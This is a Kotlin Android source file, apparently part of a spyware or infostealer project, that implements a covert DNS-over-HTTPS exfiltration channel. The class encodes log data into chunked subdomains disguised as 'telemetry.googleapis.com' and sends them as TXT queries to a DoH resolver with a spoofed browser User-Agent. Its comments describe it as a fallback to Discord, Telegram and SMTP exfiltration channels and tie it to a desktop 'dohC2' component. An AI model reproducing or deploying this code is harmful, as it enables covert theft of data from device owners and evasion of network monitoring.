package com.system.service.exfil

import android.util.Base64
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

/**
 * DNS-over-HTTPS fallback exfiltration channel.
 * Encodes log data as DNS TXT queries to Cloudflare DoH resolver.
 * Only used when all primary channels (Discord, Telegram, SMTP) are unconfigured.
 * Mirrors the desktop's dohC2 implementation.
 */
class DoHExfil(private val endpoint: String) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    fun isEnabled(): Boolean = endpoint.isNotBlank()

    /** Exfiltrate data via DNS queries. */
    fun send(data: String): Boolean {
        if (!isEnabled()) return false

        return try {
            // Base64url encode data
            val encoded = Base64.encodeToString(
                data.toByteArray(Charsets.UTF_8),
                Base64.URL_SAFE or Base64.NO_WRAP
            )

            // Split into 50-char chunks (DNS label max is 63)
            val chunks = splitString(encoded, 50)
            val sessionId = (System.nanoTime() and 0xFFFFFF).toString(16)

            for ((i, chunk) in chunks.withIndex()) {
                // Format: {index}-{total}-{session}-{chunk}.telemetry.googleapis.com
                val queryName = "$i-${chunks.size}-$sessionId-$chunk.telemetry.googleapis.com"
                queryDoH(queryName)
                Thread.sleep(200)
            }
            true
        } catch (_: Exception) {
            false
        }
    }

    private fun queryDoH(name: String) {
        val truncatedName = if (name.length > 253) name.take(253) else name
        val url = "$endpoint?name=$truncatedName&type=TXT"

        val request = Request.Builder()
            .url(url)
            .header("Accept", "application/dns-json")
            .header("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36")
            .build()

        try {
            client.newCall(request).execute().close()
        } catch (_: Exception) { }
    }

    private fun splitString(s: String, maxLen: Int): List<String> {
        val chunks = mutableListOf<String>()
        var remaining = s
        while (remaining.isNotEmpty()) {
            if (remaining.length <= maxLen) {
                chunks.add(remaining)
                break
            }
            chunks.add(remaining.substring(0, maxLen))
            remaining = remaining.substring(maxLen)
        }
        return chunks
    }
}
